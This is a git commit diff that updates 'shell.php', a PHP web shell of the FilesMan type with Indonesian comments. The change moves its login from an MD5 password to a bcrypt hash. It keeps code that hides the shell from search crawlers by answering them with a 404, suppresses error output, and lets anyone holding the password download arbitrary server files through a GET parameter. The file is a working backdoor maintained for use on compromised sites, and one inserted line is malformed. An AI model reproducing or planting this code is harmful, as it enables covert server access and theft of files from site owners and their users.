aa46815d2f5999cb9f8c65f9d729d08579a746e7
@Notpino <159519253+notmuzakki@users.noreply.github.com>
2025-01-05 15:35:27 +0700

    shell.php

--- shell.php
+++ shell.php
@@ -9,20 +9,25 @@ set_time_limit(0);
 @ini_set('output_buffering',0);
 @ini_set('display_errors', 0);
 
-$password 			= "21232f297a57a5a743894a0e4a801fc";   
-$color 				= "#00ff00";
-$default_action 	= 'FilesMan';
-$default_use_ajax 	= true;
-$default_charset 	= 'UTF-8';
+<?php
+session_start();
 
-if(!empty($_SERVER['HTTP_USER_AGENT'])) {
-	$userAgents = array("Googlebot", "Slurp", "MSNBot", "PycURL", "facebookexternalhit", "ia_archiver", "crawler", "Yandex", "Rambler", "Yahoo! Slurp", "YahooSeeker", "bingbot");
-	if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
-		header('HTTP/1.0 404 Not Found');
-		exit;
-	}
+$password_hash = '$2y$10$b9tkoH5LcnS./JGPSLBDKeBK6Da1MlCBiSpcnLzm61XdmdruB5A46';
+$color = "#00ff00";
+$default_action = 'FilesMan';
+$default_use_ajax = true;
+$default_charset = 'UTF-8';
+
+// Cegah bot dengan user agent tertentu
+if (!empty($_SERVER['HTTP_USER_AGENT'])) {
+    $userAgents = array("Googlebot", "Slurp", "MSNBot", "PycURL", "facebookexternalhit", "ia_archiver", "crawler", "Yandex", "Rambler", "Yahoo! Slurp", "YahooSeeker", "bingbot");
+    if (preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
+        header('HTTP/1.0 404 Not Found');
+        exit;
+    }
 }
 
+// Fungsi login
 function login_shell() {
 ?>
 <!DOCTYPE html>
@@ -140,29 +145,38 @@ function login_shell() {
 </body>
 </html>
 
-<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             
-exit;
-	}
+<?php
+    exit;
+}
 
-	if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])]))
-	if( empty($password) || ( isset($_POST['pass']) && (md5($_POST['pass']) == $password) ) )
-		$_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
-	else
-	login_shell();
-	if(isset($_GET['file']) && ($_GET['file'] != '') && ($_GET['act'] == 'download')) {
-		@ob_clean();
-		$file = $_GET['file'];
-		header('Content-Description: File Transfer');
-		header('Content-Type: application/octet-stream');
-		header('Content-Disposition: attachment; filename="'.basename($file).'"');
-		header('Expires: 0');
-		header('Cache-Control: must-revalidate');
-		header('Pragma: public');
-		header('Content-Length: ' . filesize($file));
-		readfile($file);
-		exit;
-	}
-	?>
+// Proses autentikasi
+if (!isset($_SESSION[md5($_SERVER['HTTP_HOST'])])) {
+    if (isset($_POST['password']) && password_verify($_POST['password'], $password_hash)) {
+        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
+    } else {
+        login_shell();
+    }
+}
+
+// Fitur download file (opsional)
+if (isset($_GET['file']) && ($_GET['file'] != '') && ($_GET['act'] == 'download')) {
+    @ob_clean();
+    $file = $_GET['file'];
+    if (file_exists($file)) {
+        header('Content-Description: File Transfer');
+        header('Content-Type: application/octet-stream');
+        header('Content-Disposition: attachment; filename="' . basename($file) . '"');
+        header('Expires: 0');
+        header('Cache-Control: must-revalidate');
+        header('Pragma: public');
+        header('Content-Length: ' . filesize($file));
+        readfile($file);
+    } else {
+        echo "File tidak ditemukan.";
+    }
+    exit;
+}
+?>
 <?php
 	function w($dir,$perm) {
 		if(!is_writable($dir)) {
